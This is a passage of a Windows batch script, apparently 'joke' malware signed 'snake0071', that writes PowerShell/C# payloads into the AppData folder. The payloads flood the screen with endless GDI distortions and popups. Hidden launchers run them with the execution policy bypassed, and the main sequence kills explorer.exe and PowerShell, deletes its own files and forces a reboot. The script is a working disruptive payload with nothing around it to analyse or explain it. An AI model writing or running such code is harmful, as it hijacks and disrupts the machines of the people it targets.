echo     [DllImport("gdi32.dll")] >> 2b.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject); >> 2b.ps1
echo     [DllImport("gdi32.dll")] >> 2b.ps1
echo     public static extern bool DeleteObject(IntPtr hObject); >> 2b.ps1
echo     [DllImport("gdi32.dll")] >> 2b.ps1
echo     public static extern bool Ellipse(IntPtr hdc, int left, int top, int right, int bottom); >> 2b.ps1
echo     [DllImport("user32.dll")] >> 2b.ps1
echo     public static extern int GetSystemMetrics(int smIndex); >> 2b.ps1
echo     [DllImport("user32.dll")] >> 2b.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc); >> 2b.ps1
echo     public static void RandomEllipseGraphicsEffect() >> 2b.ps1
echo     { >> 2b.ps1
echo         int screenWidth = GetSystemMetrics(0); >> 2b.ps1
echo         int screenHeight = GetSystemMetrics(1); >> 2b.ps1
echo         int signX = 1; >> 2b.ps1
echo         int signY = 1; >> 2b.ps1
echo         int incrementor = 10; >> 2b.ps1
echo         int x = 10; >> 2b.ps1
echo         int y = 10; >> 2b.ps1
echo         while (true) >> 2b.ps1
echo         { >> 2b.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero); >> 2b.ps1
echo             x += incrementor * signX; >> 2b.ps1
echo             y += incrementor * signY; >> 2b.ps1
echo             int top_x = 0 + x; >> 2b.ps1
echo             int top_y = 0 + y; >> 2b.ps1
echo             int bottom_x = 100 + x; >> 2b.ps1
echo             int bottom_y = 100 + y; >> 2b.ps1
echo             IntPtr brush = CreateSolidBrush((uint)(new Random().Next() %% 0xFFFFFF)); >> 2b.ps1
echo             SelectObject(hdc, brush); >> 2b.ps1
echo             Ellipse(hdc, top_x, top_y, bottom_x, bottom_y); >> 2b.ps1
echo             if ^(y ^>= screenHeight) >> 2b.ps1
echo             { >> 2b.ps1
echo                 signY = -1; >> 2b.ps1
echo             } >> 2b.ps1
echo             if ^(x ^>= screenWidth) >> 2b.ps1
echo             { >> 2b.ps1
echo                 signX = -1; >> 2b.ps1
echo             } >> 2b.ps1
echo             if ^(y == 0) >> 2b.ps1
echo             { >> 2b.ps1
echo                 signY = 1; >> 2b.ps1
echo             } >> 2b.ps1
echo             if ^(x == 0) >> 2b.ps1
echo             { >> 2b.ps1
echo                 signX = 1; >> 2b.ps1
echo             } >> 2b.ps1
echo             DeleteObject(brush); >> 2b.ps1
echo             ReleaseDC(IntPtr.Zero, hdc); >> 2b.ps1
echo             System.Threading.Thread.Sleep(10); >> 2b.ps1
echo         } >> 2b.ps1
echo     } >> 2b.ps1
echo } >> 2b.ps1
echo ^"@ >> 2b.ps1
echo [GraphicsHelper]::RandomEllipseGraphicsEffect() >> 2b.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                        > graficdest.ps1
echo using System;                                                                                                                                                       >> graficdest.ps1
echo using System.Runtime.InteropServices;                                                                                                                               >> graficdest.ps1
echo public class BitBltEffect                                                                                                                                           >> graficdest.ps1
echo {                                                                                                                                                                   >> graficdest.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> graficdest.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                                 >> graficdest.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> graficdest.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                                    >> graficdest.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                        >> graficdest.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);             >> graficdest.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> graficdest.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                          >> graficdest.ps1
echo     public static void RunBitBltEffect()                                                                                                                            >> graficdest.ps1
echo     {                                                                                                                                                               >> graficdest.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                            >> graficdest.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                                      >> graficdest.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                                     >> graficdest.ps1
echo         Random random = new Random();                                                                                                                               >> graficdest.ps1
echo         while (true)                                                                                                                                                >> graficdest.ps1
echo         {                                                                                                                                                           >> graficdest.ps1
echo             BitBlt(hdc, random.Next(66), random.Next(66), screenWidth, screenHeight, hdc, random.Next(66), random.Next(66), 0x001100A6);                        >> graficdest.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                                      >> graficdest.ps1
echo         }                                                                                                                                                           >> graficdest.ps1
echo     }                                                                                                                                                               >> graficdest.ps1
echo }                                                                                                                                                                   >> graficdest.ps1
echo ^"@                                                                                                                                                                 >> graficdest.ps1
echo [BitBltEffect]::RunBitBltEffect()                                                                                                                                   >> graficdest.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                        > fastright.ps1
echo using System;                                                                                                                                                       >> fastright.ps1
echo using System.Runtime.InteropServices;                                                                                                                               >> fastright.ps1
echo public class ScreenEffect                                                                                                                                           >> fastright.ps1
echo {                                                                                                                                                                   >> fastright.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> fastright.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                                 >> fastright.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> fastright.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                                    >> fastright.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                        >> fastright.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);             >> fastright.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> fastright.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                          >> fastright.ps1
echo     public static void RunScreenEffect()                                                                                                                            >> fastright.ps1
echo     {                                                                                                                                                               >> fastright.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                            >> fastright.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                                      >> fastright.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                                     >> fastright.ps1
echo         int xOffset = 0;                                                                                                                                            >> fastright.ps1
echo         int stepSize = 1;                                                                                                                                           >> fastright.ps1
echo         while (true)                                                                                                                                                >> fastright.ps1
echo         {                                                                                                                                                           >> fastright.ps1
echo             BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, xOffset, 0, 0x00CC0020);                                                                              >> fastright.ps1
echo             xOffset -= stepSize;                                                                                                                                    >> fastright.ps1
echo             if (xOffset ^>= screenWidth)                                                                                                                            >> fastright.ps1
echo                 xOffset = 0;                                                                                                                                        >> fastright.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                                      >> fastright.ps1
echo         }                                                                                                                                                           >> fastright.ps1
echo     }                                                                                                                                                               >> fastright.ps1
echo }                                                                                                                                                                   >> fastright.ps1
echo ^"@                                                                                                                                                                 >> fastright.ps1
echo [ScreenEffect]::RunScreenEffect()                                                                                                                                   >> fastright.ps1
echo                                                                                                                                                                     >> fastright.ps1
echo                                                                                                                                                                     >> fastright.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                   >> mirroreffects.ps1
echo using System;                                                                                                                                  >> mirroreffects.ps1
echo using System.Runtime.InteropServices;                                                                                                          >> mirroreffects.ps1
echo public class ScreenEffect                                                                                                                      >> mirroreffects.ps1
echo {                                                                                                                                              >> mirroreffects.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> mirroreffects.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                            >> mirroreffects.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> mirroreffects.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                               >> mirroreffects.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                   >> mirroreffects.ps1
echo     public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,                  >> mirroreffects.ps1
echo         IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);                                           >> mirroreffects.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> mirroreffects.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                     >> mirroreffects.ps1
echo     public static void RunScreenEffect()                                                                                                       >> mirroreffects.ps1
echo     {                                                                                                                                          >> mirroreffects.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                       >> mirroreffects.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                 >> mirroreffects.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                >> mirroreffects.ps1
echo         int x = 0, y = 0;                                                                                                                      >> mirroreffects.ps1
echo         int width = screenWidth, height = screenHeight;                                                                                        >> mirroreffects.ps1
echo         int radius = 100;                                                                                                                      >> mirroreffects.ps1
echo         int stepSize = 5;                                                                                                                      >> mirroreffects.ps1
echo         while (true)                                                                                                                           >> mirroreffects.ps1
echo         {                                                                                                                                      >> mirroreffects.ps1
echo             StretchBlt(hdc, x, y, width, height, hdc, x + radius, y, width - radius * 2, height, 0x00CC0020);                                  >> mirroreffects.ps1
echo             x += stepSize;                                                                                                                     >> mirroreffects.ps1
echo             y += stepSize;                                                                                                                     >> mirroreffects.ps1
echo             width -= stepSize * 2;                                                                                                             >> mirroreffects.ps1
echo             height -= stepSize * 2;                                                                                                            >> mirroreffects.ps1
echo             if (x ^<= 0 ^|^| y ^<= 0 ^|^| x + width ^>= screenWidth ^|^| y + height ^>= screenHeight)                                          >> mirroreffects.ps1
echo             {                                                                                                                                  >> mirroreffects.ps1
echo                 x = 0;                                                                                                                         >> mirroreffects.ps1
echo                 y = 0;                                                                                                                         >> mirroreffects.ps1
echo                 width = screenWidth;                                                                                                           >> mirroreffects.ps1
echo                 height = screenHeight;                                                                                                         >> mirroreffects.ps1
echo             }                                                                                                                                  >> mirroreffects.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                 >> mirroreffects.ps1
echo         }                                                                                                                                      >> mirroreffects.ps1
echo     }                                                                                                                                          >> mirroreffects.ps1
echo }                                                                                                                                              >> mirroreffects.ps1
echo ^"@                                                                                                                                            >> mirroreffects.ps1
echo [ScreenEffect]::RunScreenEffect()                                                                                                              >> mirroreffects.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                               > mirroreffects2.ps1
echo using System;                                                                                                                                              >> mirroreffects2.ps1
echo using System.Runtime.InteropServices;                                                                                                                      >> mirroreffects2.ps1
echo public class DistortionEffect                                                                                                                              >> mirroreffects2.ps1
echo {                                                                                                                                                          >> mirroreffects2.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> mirroreffects2.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                        >> mirroreffects2.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> mirroreffects2.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                           >> mirroreffects2.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                               >> mirroreffects2.ps1
echo     public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,                              >> mirroreffects2.ps1
echo         IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);                                                       >> mirroreffects2.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> mirroreffects2.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                 >> mirroreffects2.ps1
echo     public static void RunDistortionEffect()                                                                                                               >> mirroreffects2.ps1
echo     {                                                                                                                                                      >> mirroreffects2.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                   >> mirroreffects2.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                             >> mirroreffects2.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                            >> mirroreffects2.ps1
echo         int x = 0, y = 0;                                                                                                                                  >> mirroreffects2.ps1
echo         int width = screenWidth, height = screenHeight;                                                                                                    >> mirroreffects2.ps1
echo         int distortion = 10;                                                                                                                               >> mirroreffects2.ps1
echo         int stepSize = 5;                                                                                                                                  >> mirroreffects2.ps1
echo         while (true)                                                                                                                                       >> mirroreffects2.ps1
echo         {                                                                                                                                                  >> mirroreffects2.ps1
echo             StretchBlt(hdc, x, y, width, height, hdc, x - distortion, y - distortion, width + distortion * 2, height + distortion * 2, 0x00CC0020);        >> mirroreffects2.ps1
echo             x += stepSize;                                                                                                                                 >> mirroreffects2.ps1
echo             y += stepSize;                                                                                                                                 >> mirroreffects2.ps1
echo             width -= stepSize * 2;                                                                                                                         >> mirroreffects2.ps1
echo             height -= stepSize * 2;                                                                                                                        >> mirroreffects2.ps1
echo             if (x ^<= 0 ^|^| y ^<= 0 ^|^| x + width ^>= screenWidth ^|^| y + height ^>= screenHeight)                                                      >> mirroreffects2.ps1
echo             {                                                                                                                                              >> mirroreffects2.ps1
echo                 x = 0;                                                                                                                                     >> mirroreffects2.ps1
echo                 y = 0;                                                                                                                                     >> mirroreffects2.ps1
echo                 width = screenWidth;                                                                                                                       >> mirroreffects2.ps1
echo                 height = screenHeight;                                                                                                                     >> mirroreffects2.ps1
echo             }                                                                                                                                              >> mirroreffects2.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                             >> mirroreffects2.ps1
echo         }                                                                                                                                                  >> mirroreffects2.ps1
echo     }                                                                                                                                                      >> mirroreffects2.ps1
echo }                                                                                                                                                          >> mirroreffects2.ps1
echo ^"@                                                                                                                                                        >> mirroreffects2.ps1
echo [DistortionEffect]::RunDistortionEffect()                                                                                                                  >> mirroreffects2.ps1

echo Add-Type -AssemblyName System.Windows.Forms                                                                                                                                                > letters.ps1                                                                                                                                                 
echo Add-Type -AssemblyName System.Drawing                                                                                                                                                       >> letters.ps1
echo while ($true) {                                                                                                                                                                             >> letters.ps1
echo     for ($i = 1; $i -le 20; $i++) {                                                                                                                                                         >> letters.ps1
echo         $form = New-Object System.Windows.Forms.Form                                                                                                                                        >> letters.ps1
echo         $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                                                                                >> letters.ps1
echo         $form.StartPosition = "Manual"                                                                                                                                                      >> letters.ps1
echo         $form.Top = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - 100)                                                                       >> letters.ps1
echo         $form.Left = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - 200)                                                                       >> letters.ps1
echo         $form.Size = New-Object System.Drawing.Size(430, 50)                                                                                                                                >> letters.ps1
echo         $form.ShowInTaskbar = $false                                                                                                                                                        >> letters.ps1
echo         $label = New-Object System.Windows.Forms.Label                                                                                                                                      >> letters.ps1
echo         $label.AutoSize = $true                                                                                                                                                             >> letters.ps1
echo         $label.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)                                                                                      >> letters.ps1
echo         $label.ForeColor = [System.Drawing.Color]::FromArgb((Get-Random -Minimum 0 -Maximum 256), (Get-Random -Minimum 0 -Maximum 256), (Get-Random -Minimum 0 -Maximum 256))               >> letters.ps1
echo         $label.Text = "JOKE.BAT"                                                                                                                                                            >> letters.ps1
echo         $form.Controls.Add($label)                                                                                                                                                          >> letters.ps1
echo         $form.Show()                                                                                                                                                                        >> letters.ps1
echo         Start-Sleep -Seconds 1                                                                                                                                                              >> letters.ps1
echo     }                                                                                                                                                                                       >> letters.ps1
echo     $openForms = [System.Windows.Forms.Application]::OpenForms                                                                                                                              >> letters.ps1
echo     foreach ($form in $openForms) {                                                                                                                                                         >> letters.ps1
echo         $form.Close()                                                                                                                                                                       >> letters.ps1
echo     }                                                                                                                                                                                       >> letters.ps1
echo }                                                                                                                                                                                           >> letters.ps1

echo Add-Type -TypeDefinition @^"                                                                                                              > light.ps1
echo using System;                                                                                                                             >> light.ps1
echo using System.Runtime.InteropServices;                                                                                                     >> light.ps1
echo public class GraphicsHelper                                                                                                               >> light.ps1
echo {                                                                                                                                         >> light.ps1
echo     [DllImport("user32.dll")]                                                                                                             >> light.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                       >> light.ps1
echo     [DllImport("gdi32.dll")]                                                                                                              >> light.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,                                     >> light.ps1
echo         IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);                                                                                 >> light.ps1
echo     [DllImport("user32.dll")]                                                                                                             >> light.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                               >> light.ps1
echo     [DllImport("user32.dll")]                                                                                                             >> light.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                          >> light.ps1
echo     [DllImport("kernel32.dll")]                                                                                                           >> light.ps1
echo     public static extern void Sleep(int milliseconds);                                                                                    >> light.ps1
echo     public static void GraphicsEffect()                                                                                                   >> light.ps1
echo     {                                                                                                                                     >> light.ps1
echo         IntPtr hdc;                                                                                                                       >> light.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                            >> light.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                           >> light.ps1
echo         Random random = new Random();                                                                                                     >> light.ps1
echo         while (true)                                                                                                                      >> light.ps1
echo         {                                                                                                                                 >> light.ps1
echo             hdc = GetDC(IntPtr.Zero);                                                                                                     >> light.ps1
echo             BitBlt(hdc, random.Next(2), random.Next(2), screenWidth, screenHeight, hdc, random.Next(2), random.Next(2), 0x008800C6);      >> light.ps1
echo             Sleep(10);                                                                                                                    >> light.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                  >> light.ps1
echo         }                                                                                                                                 >> light.ps1
echo     }                                                                                                                                     >> light.ps1
echo }                                                                                                                                         >> light.ps1
echo ^"@                                                                                                                                        >> light.ps1
echo [GraphicsHelper]::GraphicsEffect()                                                                                                        >> light.ps1

echo cd %appdata%\ren\ > letters.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> letters.bat
set "ea=%appdata%\ren\letters.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> letters.bat

echo cd %appdata%\ren\ > mirroreffects2.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> mirroreffects2.bat
set "ea=%appdata%\ren\mirroreffects2.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> mirroreffects2.bat


echo cd %appdata%\ren\ > mirroreffects.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> mirroreffects.bat
set "ea=%appdata%\ren\mirroreffects.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> mirroreffects.bat

echo cd %appdata%\ren\ > fastright.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> fastright.bat
set "ea=%appdata%\ren\fastright.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> fastright.bat

echo cd %appdata%\ren\ > graficdest.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> graficdest.bat
set "ea=%appdata%\ren\graficdest.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> graficdest.bat

echo cd %appdata%\ren\ > fastleft.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> fastleft.bat
set "ea=%appdata%\ren\fastleft.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> fastleft.bat

echo cd %appdata%\ren\ > graficdest2.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> graficdest2.bat
set "ea=%appdata%\ren\graficdest2.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> graficdest2.bat

echo cd %appdata%\ren\ > verysh.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> verysh.bat
set "ea=%appdata%\ren\verysh.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> verysh.bat

echo cd %appdata%\ren\ > veryscopy.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> veryscopy.bat
set "ea=%appdata%\ren\veryscopy.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> veryscopy.bat

echo cd %appdata%\ren\ > MOUSEMOVE.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> MOUSEMOVE.bat
set "ea=%appdata%\ren\MOUSEMOVE.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> MOUSEMOVE.bat

echo cd %appdata%\ren\ > melting.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> melting.bat
set "ea=%appdata%\ren\melting.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> melting.bat

echo cd %appdata%\ren\ > scopy.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> scopy.bat
set "ea=%appdata%\ren\scopy.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> scopy.bat

echo cd %appdata%\ren\ > fastup.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> fastup.bat
set "ea=%appdata%\ren\fastup.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> fastup.bat

echo cd %appdata%\ren\ > mouseicon.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> mouseicon.bat
set "ea=%appdata%\ren\mouseicon.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> mouseicon.bat
  
echo cd %appdata%\ren\ > 2b.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 2b.bat
set "ea=%appdata%\ren\2b.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 2b.bat

echo cd %appdata%\ren\ > benben.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> benben.bat
set "ea=%appdata%\ren\benben.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> benben.bat

echo cd %appdata%\ren\ > song.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song.bat
set "ea=%appdata%\ren\song.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> song.bat

echo cd %appdata%\ren\ > light.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> light.bat
set "ea=%appdata%\ren\light.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> light.bat
start /min MOUSEMOVE.bat & start /min mouseicon.bat
start /min melting.bat & start /min song.bat
timeout 5
start /min light.bat
timeout 23
start /min mirroreffects.bat 
timeout 3
start /min MOUSEMOVE.bat & start /min mouseicon.bat
start /min benben.bat
start /min verysh.bat
timeout 27
start /min taskkill /f /im powershell.exe & start /min benben.bat
start /min MOUSEMOVE.bat & start /min mouseicon.bat
start /min mirroreffects2.bat
start /min letters.bat
timeout 12
start /min song.bat
start /min veryscopy.bat
timeout 25
start /min %appdata%\ren\fastleft.bat
start /min fastright.bat
start /min 2b.bat
timeout 18
start /min graficdest
timeout 10
start /min fastup.bat
start /min light.bat
timeout 30
taskkill /f /im explorer.exe
start /min taskkill /f /im powershell.exe
start /min MOUSEMOVE.bat & start /min mouseicon.bat
start /min benben.bat & start /min song.bat
start /min 2b.bat
timeout 1
start /min 2b.bat
timeout 1
start /min 2b.bat
timeout 15
start /min scopy.bat
start /min mirroreffects2.bat
timeout 5
start /min letters.bat
timeout 25
start /min veryscopy.bat
timeout 30
del /s /q %appdata%\ren\*.*
shutdown -r -t 15 -c "snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 snake0071 "










